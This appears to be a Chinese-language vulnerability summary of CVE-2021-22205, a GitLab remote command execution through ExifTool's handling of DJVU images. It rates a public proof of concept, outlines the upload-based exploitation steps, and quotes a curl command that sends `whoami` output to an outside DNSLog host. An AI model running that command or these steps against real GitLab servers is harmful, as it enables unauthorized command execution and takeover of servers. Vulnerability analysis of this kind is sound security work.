## CVE-2021-22205-GitLab-远程命令执行

**漏洞编号:** CVE-2021-22205

**漏洞类型:** 远程命令执行

**影响应用:** GitLab

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**利用条件:** 需要网络访问，且目标GitLab实例存在漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-22205 漏洞是 GitLab CE/EE 版本中存在的一个远程命令执行漏洞。该漏洞源于 GitLab 对上传的图像文件处理不当，攻击者可以通过上传特制的图像文件，利用 ExifTool 的漏洞执行任意命令。该漏洞影响的版本包括 11.9 到 13.8.8，13.9 到 13.9.6 以及 13.10 到 13.10.3。 

**有效性：**

根据提供的漏洞信息和POC代码，可以判断该POC代码是有效的。POC代码通过构造恶意的DJVU图像文件，在其中嵌入了命令，利用ExifTool处理图像时执行该命令。POC代码能够成功利用漏洞。

**投毒风险：**

对POC代码的投毒风险分析如下：

*   代码主要功能是利用漏洞，结构清晰，目的是构造恶意图片并发送请求。
*   虽然存在执行任意命令的风险，但这属于漏洞本身的特性，而非作者额外添加的恶意代码。
*   其中`curl `whoami`.82sm53.dnslog.cn`只是一个DNSLog检测，用于验证漏洞是否存在，并非恶意投毒。

虽然攻击者可以利用此漏洞执行恶意操作，但就提供的POC代码本身而言，不存在明显的投毒行为。因此，投毒风险较低，大约为5%。主要风险在于使用该POC进行未授权的渗透测试。

**利用方式：**

1.  攻击者首先访问目标GitLab实例的登录页面（/users/sign_in），获取CSRF Token。
2.  攻击者构造一个恶意的DJVU图像文件，该文件包含嵌入的命令，这些命令将在ExifTool处理该图像时执行。`attack` 函数中的代码允许通过 `-c` 参数指定要执行的命令。
3.  攻击者通过/uploads/user接口上传构造的恶意图像文件。同时在POST请求中带上CSRF Token。
4.  当GitLab处理上传的图像文件时，ExifTool会解析该文件，并执行嵌入的命令。
5.  攻击者通过DNSLog或其他方式来接收命令执行的结果，或者直接利用执行的命令控制服务器。

**项目地址:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**漏洞详情:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)